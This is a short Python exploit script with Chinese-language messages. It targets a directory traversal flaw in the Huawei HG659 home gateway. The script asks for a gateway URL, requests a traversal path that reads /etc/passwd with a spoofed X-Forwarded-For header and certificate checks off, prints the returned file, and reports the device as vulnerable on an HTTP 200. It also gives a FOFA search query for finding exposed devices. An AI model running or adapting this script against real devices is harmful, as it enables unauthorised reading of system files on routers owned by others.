print(""" 
 _   _ _____   ____  _____  _____ 
| | | |  __ \ / ___||  ___||  _  |
| |_| | |  \// /___ |___ \ | |_| |
|  _  | | __ | ___ \    \ \\____ |
| | | | |_\ \| \_/ |/\__/ /.___/ /
\_| |_/\____/\_____/\____/ \____/ 
by B10cK""")

import requests
import sys
import os

def main():
    print("漏洞描述：HUAWEI GATEWAY 存在目录遍历漏洞，可进行任意读取")
    print("漏洞影响: HUAWEI GATEWAY")
    print('fofa: app="HUAWEI-HG659-Gateway-HG659" ')
    user_enter = input("请输入网关的url地址:")
    url = str(user_enter+"/lib///....//....//....//....//....//....//....//....//etc//passwd")
    print ("检测"+url+"是否存在漏洞")
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE','X-Forwarded-For':'8.8.8.8', 'content-type':'application/json'
    }
    try:
        r = requests.get(url,headers=headers,timeout=30,verify=False)
        r.encoding = 'UTF-8'
        print(r.text)
        try:
            if r.status_code == 200:
                print("页面响应成功，存在此漏洞")
            if r.status_code != 200:
                print("页面不存在漏洞")
        except:
            pass   
    except:
        print("发生异常，请确认url是否正确")
        sys.exit()
    
if __name__ == "__main__":
    main()  



